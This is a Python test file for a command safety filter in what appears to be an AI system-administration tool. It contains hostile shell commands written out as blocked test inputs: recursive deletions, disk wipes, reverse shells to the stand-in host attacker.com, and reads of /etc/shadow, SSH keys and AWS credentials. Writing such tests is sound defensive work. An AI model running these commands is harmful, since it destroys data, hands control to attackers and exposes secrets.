"""Tests for safety filters."""

import pytest

from kimi_sysadmin_ai.safety import SafetyFilter, SafetyLevel


class TestSafetyFilter:
    """Test cases for the safety filter."""
    
    def setup_method(self):
        """Set up test fixtures."""
        self.filter = SafetyFilter()
    
    # Safe commands
    def test_safe_ls(self):
        result = self.filter.check("ls -la")
        assert result.level == SafetyLevel.SAFE
    
    def test_safe_cat(self):
        result = self.filter.check("cat /etc/hostname")
        assert result.level == SafetyLevel.SAFE
    
    def test_safe_ps(self):
        result = self.filter.check("ps aux")
        assert result.level == SafetyLevel.SAFE
    
    def test_safe_grep(self):
        result = self.filter.check("grep -r 'pattern' /var/log")
        assert result.level == SafetyLevel.SAFE
    
    # Blocked commands - Mass deletion
    def test_block_rm_rf_root(self):
        result = self.filter.check("rm -rf /")
        assert result.level == SafetyLevel.BLOCK
    
    def test_block_rm_rf_var(self):
        result = self.filter.check("rm -rf /var")
        assert result.level == SafetyLevel.BLOCK
    
    def test_block_rm_rf_home(self):
        result = self.filter.check("rm -rf ~")
        assert result.level == SafetyLevel.BLOCK
    
    def test_block_rm_rf_current(self):
        result = self.filter.check("rm -rf .")
        assert result.level == SafetyLevel.BLOCK
    
    # Blocked commands - Filesystem destruction
    def test_block_mkfs(self):
        result = self.filter.check("mkfs.ext4 /dev/sda1")
        assert result.level == SafetyLevel.BLOCK
    
    def test_block_dd_disk(self):
        result = self.filter.check("dd if=/dev/zero of=/dev/sda")
        assert result.level == SafetyLevel.BLOCK
    
    # Blocked commands - Reverse shells
    def test_block_bash_reverse_shell(self):
        result = self.filter.check("bash -i >& /dev/tcp/attacker.com/4444 0>&1")
        assert result.level == SafetyLevel.BLOCK
    
    def test_block_nc_reverse_shell(self):
        result = self.filter.check("nc -e /bin/sh attacker.com 4444")
        assert result.level == SafetyLevel.BLOCK
    
    def test_block_python_reverse_shell(self):
        result = self.filter.check("python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"attacker.com\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\"])'")
        assert result.level == SafetyLevel.BLOCK
    
    # Blocked commands - Credential access
    def test_block_cat_shadow(self):
        result = self.filter.check("cat /etc/shadow")
        assert result.level == SafetyLevel.BLOCK
    
    def test_block_cat_ssh_key(self):
        result = self.filter.check("cat /root/.ssh/id_rsa")
        assert result.level == SafetyLevel.BLOCK
    
    def test_block_cat_aws_credentials(self):
        result = self.filter.check("cat ~/.aws/credentials")
        assert result.level == SafetyLevel.BLOCK
    
    def test_block_cat_bash_history(self):
        result = self.filter.check("cat /root/.bash_history")
        assert result.level == SafetyLevel.BLOCK
    
    # Graylisted commands
    def test_gray_apt_install(self):
        result = self.filter.check("apt install nginx")
        assert result.level == SafetyLevel.GRAY
    
    def test_gray_systemctl_restart(self):
        result = self.filter.check("systemctl restart nginx")
        assert result.level == SafetyLevel.GRAY
    
    def test_gray_docker_run(self):
        result = self.filter.check("docker run -it ubuntu")
        assert result.level == SafetyLevel.GRAY
    
    def test_gray_kubectl_delete(self):
        result = self.filter.check("kubectl delete pod mypod")
        assert result.level == SafetyLevel.GRAY
    
    def test_gray_chmod_777(self):
        result = self.filter.check("chmod -R 777 /var/www")
        assert result.level == SafetyLevel.GRAY
    
    # Helper methods
    def test_is_safe_true(self):
        assert self.filter.is_safe("ls -la") is True
    
    def test_is_safe_false(self):
        assert self.filter.is_safe("rm -rf /") is False
    
    def test_is_blocked_true(self):
        assert self.filter.is_blocked("rm -rf /") is True
    
    def test_is_blocked_false(self):
        assert self.filter.is_blocked("ls -la") is False
